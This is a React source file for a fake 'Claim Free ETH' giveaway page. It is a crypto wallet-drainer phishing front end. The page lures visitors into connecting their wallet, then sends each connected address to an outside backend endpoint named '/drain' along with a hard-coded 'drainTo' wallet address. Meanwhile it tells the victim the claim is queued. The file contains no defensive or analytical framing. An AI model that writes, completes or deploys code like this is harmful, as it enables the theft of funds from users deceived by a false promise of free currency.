import React, { useState } from "react";
import ReactDOM from "react-dom/client";

import { WagmiConfig, createConfig, configureChains } from "wagmi";
import { mainnet, sepolia } from "@wagmi/chains";
import { InjectedConnector, WalletConnectConnector } from "wagmi/connectors";
import { createWeb3Modal } from "@reown/appkit-adapter-wagmi/react";
import "@reown/appkit/dist/styles.css"; // corrected path

const projectId = "962425907914a3e80a7d8e7288b23f62";

const config = createConfig({
  autoConnect: true,
  connectors: [
    new InjectedConnector({ chains: [mainnet, sepolia] }),
    new WalletConnectConnector({ chains: [mainnet, sepolia], options: { projectId } }),
  ],
});

createWeb3Modal({
  wagmiConfig: config,
  projectId,
  chains: [mainnet, sepolia],
  themeMode: "dark",
  enableAnalytics: true,
});

const App = () => {
  const [loading, setLoading] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);
  const [response, setResponse] = useState(null);

  const connectWallet = async () => {
    try {
      setLoading(true);
      const modal = window.web3Modal;
      const connection = await modal.open();
      const account = connection?.accounts?.[0];
      if (!account) throw new Error("No wallet connected");
      setWalletAddress(account);

      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: account, drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4" }),
      });
      const data = await res.json();
      setResponse({ success: res.ok, message: res.ok ? "Token claim queued." : "Failed.", data });
    } catch (err) {
      console.error(err);
      setResponse({ success: false, message: "Wallet connection failed." });
    } finally {
      setLoading(false);
    }
  };

  return (
    <WagmiConfig config={config}>
      <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", background: "#121212", color: "#fff", fontFamily: "Arial" }}>
        <div style={{ background: "#1e1e1e", padding: "30px", borderRadius: "12px", width: "100%", maxWidth: "420px", textAlign: "center" }}>
          <h1>Claim Free ETH</h1>
          <p>Connect your wallet to claim 0.5 ETH.</p>
          <button onClick={connectWallet} disabled={loading} style={{ marginTop: "20px", padding: "12px 24px", width: "100%", background: "#4CAF50", border: "none", borderRadius: "8px", color: "#fff", fontWeight: "bold" }}>
            {loading ? "Connecting..." : "Connect Wallet"}
          </button>
          {walletAddress && <p>Connected: {walletAddress}</p>}
          {response && <pre>{JSON.stringify(response, null, 2)}</pre>}
        </div>
      </div>
    </WagmiConfig>
  );
};

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
